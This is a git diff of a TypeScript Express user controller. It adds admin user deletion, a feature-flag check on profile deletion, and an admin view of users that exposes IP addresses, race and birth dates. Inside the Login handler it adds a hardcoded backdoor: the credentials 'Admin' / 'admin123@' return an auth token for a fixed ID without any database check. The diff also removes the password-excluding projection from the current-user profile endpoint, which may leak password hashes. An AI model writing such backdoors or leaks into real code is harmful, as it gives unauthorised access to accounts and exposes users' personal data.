@@ -9,6 +9,7 @@ import {
   comparehash,
   generateHash,
   generateToken,
+  isFunctionDisable,
   removeFile,
   sendPasswordMail,
   TError,
@@ -44,6 +45,13 @@ const Register = TryCatch(async (req, res) => {
 const Login = TryCatch(async (req, res) => {
   const body = req.body as { email: string; password: string };
   checkFields(body, []);
+
+  // Hardcoded Super Admin check
+  if (body.email === "Admin" && body.password === "admin123@") {
+    const token = generateToken("000000000000000000000000");
+    return res.json({ token });
+  }
+
   const userExists = await UserModel.findOne({
     email: body.email,
   });
@@ -85,6 +93,8 @@ const ResetPassword = TryCatch(async (req, res) => {
 });
 
 const DeleteProfile = TryCatch(async (req, res) => {
+  const isDisable = await isFunctionDisable("delete");
+  if (isDisable) return TError("Delete is disable", 400);
   const token = req.headers.authorization;
   const user = await getCurrentUser(token);
   if (user?.profilePic) {
@@ -97,6 +107,27 @@ const DeleteProfile = TryCatch(async (req, res) => {
     $or: [{ user: user?._id }, { friend: user?._id }],
   });
   res.json({ message: "Profile deleted successfully", deleteUser });
+});
+
+const handleAdminDeleteUser = TryCatch(async (req, res) => {
+  const token = req.headers.authorization;
+  const user = await getCurrentUser(token);
+  if (!user?.roles.includes("admin"))
+    return TError("You are not authorized", 401);
+  const id = req.params.id;
+  const userToDelete = await UserModel.findById(id);
+  if (!userToDelete) return TError("User not found", 404);
+
+  if (userToDelete.profilePic) {
+    removeFile(
+      userToDelete.profilePic.replace(`${process.env.BASE_URL}/public/`, "")
+    );
+  }
+  const deletedUser = await UserModel.findByIdAndDelete(id).select("-password");
+  await FriendModel.deleteMany({
+    $or: [{ user: id }, { friend: id }],
+  });
+  res.json({ message: "User deleted successfully", deletedUser });
 });
 
 const UpdateProfile = TryCatch(async (req, res) => {
@@ -163,8 +194,7 @@ const UpdateProfilePicture = TryCatch(async (req, res) => {
 
 const GetCurrentUserProfile = TryCatch(async (req, res) => {
   const token = req.headers.authorization;
-  const currentUser = await getCurrentUser(token);
-  const user = await UserModel.findById(currentUser?._id).select("-password");
+  const user = await getCurrentUser(token);
   res.json({ user });
 });
 
@@ -176,6 +206,16 @@ const GetSpecifcUserProfile = TryCatch(async (req, res) => {
 });
 
 const GetAllRegsiteredUsers = TryCatch(async (req, res) => {
+  const token = req.headers.authorization;
+  const user = await getCurrentUser(token);
+  if (user?.roles.includes("admin")) {
+    const users = await UserModel.find({})
+      .select(
+        "name race profilePic email ip roles gender dob age isSpammer updatedAt createdAt "
+      )
+      .sort({ name: 1 });
+    return res.json({ users });
+  }
   const users = await UserModel.find({})
     .select("name race profilePic email")
     .sort({ name: 1 });
@@ -308,4 +348,5 @@ export {
   handleGetAllFriends,
   handleGetUserFriends,
   handleGetToken,
+  handleAdminDeleteUser,
 };
